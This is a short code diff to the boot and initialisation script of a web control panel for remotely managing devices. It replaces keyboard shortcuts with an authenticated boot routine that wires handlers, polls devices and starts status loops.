-        if (e.ctrlKey && e.shiftKey && e.key === 'F') { e.preventDefault(); rcFetchFilePrompt(); }
-        if (e.ctrlKey && e.shiftKey && e.key === 'D') { e.preventDefault(); rcShowDiagnostics(); }
-        if (e.altKey && e.key === 'ArrowLeft') { e.preventDefault(); rcKey('back'); }
-        if (e.altKey && e.key === 'Home') { e.preventDefault(); rcKey('home'); }
-        if (e.key === 'Escape') { e.preventDefault(); rcHotkey('esc'); }
-    });
-
-    rcLog('✅ UI v1.2.11 ready. Geometry from agent is the sole authority.', 'success');
 }
+
+// ============================================================
+// BOOT
+// ============================================================
+let _booted = false;
+
+function rcBootAfterAuth() {
+    if (_booted) return;
+    _booted = true;
+
+    // Wire all event handlers once
+    wireEventHandlers();
+    setupScreenInteraction();
+
+    // Initial UI state
+    const qSelect = document.getElementById('streamQuality');
+    if (qSelect) qSelect.value = String(state.refreshInterval);
+
+    if (state.showHiddenFiles) {
+        const hiddenBtn = document.getElementById('rcHiddenToggle');
+        if (hiddenBtn) {
+            hiddenBtn.classList.add('active');
+            hiddenBtn.querySelector('i').className = 'fas fa-eye';
+        }
+    }
+
+    // Start loops
+    rcRefreshDevices();
+    setInterval(rcRefreshDevices, 5000);
+    rcSetRefreshInterval(state.refreshInterval);
+    startStatusLoop();
+    tgLoad();
+
+    rcLog('✅ UI v1.2.12 ready — Godmode enabled', 'success');
+}
+
+// ============================================================
+// INIT
+// ============================================================
+document.addEventListener('DOMContentLoaded', () => {
+    setupPinGate();
+    rcCheckAuth();
+});
 </script>
 </body>
 </html>
